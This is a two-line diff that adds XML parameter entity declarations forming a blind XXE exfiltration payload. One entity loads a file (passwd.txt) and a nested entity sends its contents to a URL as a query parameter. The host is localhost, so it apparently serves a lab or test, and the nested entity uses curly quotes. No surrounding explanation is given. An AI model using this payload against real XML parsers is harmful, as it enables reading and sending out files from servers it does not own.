@@ -1,0 +1,2 @@
+<!ENTITY % pay SYSTEM "http://localhost/passwd.txt">
+<!ENTITY % int "<!ENTITY % trick SYSTEM ‘http://localhost/?var1=%pay;’>">
